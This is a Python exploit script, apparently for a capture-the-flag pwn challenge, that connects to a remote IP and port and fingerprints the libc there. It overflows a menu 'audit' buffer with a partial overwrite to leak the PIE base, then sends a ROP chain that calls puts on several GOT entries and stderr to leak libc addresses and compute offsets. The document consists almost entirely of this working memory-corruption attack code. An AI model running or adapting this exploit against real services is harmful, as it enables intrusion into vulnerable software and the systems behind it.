#!/usr/bin/env python3
"""Fingerprint the remote libc: leak puts/read/open/stderr, derive offsets."""
import socket, struct, time

HOST = "144.79.188.39"
PORT = 44942

INIT_ARRAY = 0x3d40; FRAME_DUMMY = 0x1c10
GOT_PUTS = 0x3f60; GOT_READ = 0x3f78; GOT_OPEN = 0x3fc0
DATA_STDERR = 0x4040
PLT_PUTS = 0x1154; MAIN = 0x1240; BSS = 0x4220; RET = 0x101a; POP_RDI = 0x145b
IO_STDERR_OFF = 0x21b6a0

def p64(x): return struct.pack("<Q", x)
def p16(x): return struct.pack("<H", x)
def u64(b): return struct.unpack("<Q", b.ljust(8, b"\x00"))[0]

def recvu(s, d, t=6):
    s.settimeout(t); data=b""
    while d not in data:
        c=s.recv(4096)
        if not c: break
        data+=c
    return data
def recvall(s, t=2.5):
    s.settimeout(t); data=b""
    try:
        while True:
            c=s.recv(4096)
            if not c: break
            data+=c
    except socket.timeout: pass
    return data

def audit(s, payload):
    s.sendall(b"5\n"); recvu(s, b"size?\n")
    s.sendall(b"65600\n"); recvu(s, b"note?\n")
    s.sendall(payload)

for attempt in range(80):
    s=socket.socket(); s.settimeout(12); s.connect((HOST, PORT))
    recvu(s, b"-1) exit\n")
    # leak PIE
    audit(s, b"A"*0x70 + p16(INIT_ARRAY)); time.sleep(0.3)
    out=recvall(s, 2)
    leak=b""
    if b" 4) Probe\n" in out:
        rest=out.split(b" 4) Probe\n",1)[1]
        leak=rest.split(b"-1) exit",1)[0] if b"-1) exit" in rest else rest
    if len(leak)<6: s.close(); continue
    pie=u64(leak[:6])-FRAME_DUMMY
    if pie & 0xfff: s.close(); continue
    # fingerprint: leak puts, read, open, stderr
    chain = (p64(pie+POP_RDI)+p64(pie+GOT_PUTS)+p64(pie+PLT_PUTS)+
             p64(pie+POP_RDI)+p64(pie+GOT_READ)+p64(pie+PLT_PUTS)+
             p64(pie+POP_RDI)+p64(pie+GOT_OPEN)+p64(pie+PLT_PUTS)+
             p64(pie+POP_RDI)+p64(pie+DATA_STDERR)+p64(pie+PLT_PUTS)+
             p64(pie+MAIN))
    s1=b"A"*0x68+p64(pie+BSS)+p64(0)+p64(pie+RET)+chain
    audit(s, s1); time.sleep(0.4)
    out=recvall(s, 3)
    s.close()
    # parse: each puts prints 6 bytes + newline
    lines=out.split(b"\n")
    addrs=[]
    for ln in lines:
        if len(ln)>=6:
            a=u64(ln[:6])
            if 0x700000000000 <= a <= 0x800000000000:
                addrs.append(a)
    if len(addrs)<4:
        print(f"[{attempt}] pie={hex(pie)} addrs={[hex(a) for a in addrs]}")
        continue
    puts, read, opn, stderr = addrs[0], addrs[1], addrs[2], addrs[3]
    base = stderr - IO_STDERR_OFF
    print(f"[{attempt}] pie={hex(pie)}")
    print(f"  puts   = {hex(puts)}   off={hex(puts-base)}")
    print(f"  read   = {hex(read)}   off={hex(read-base)}")
    print(f"  open   = {hex(opn)}   off={hex(opn-base)}")
    print(f"  stderr = {hex(stderr)} off={hex(stderr-base)}  (base={hex(base)})")
    break
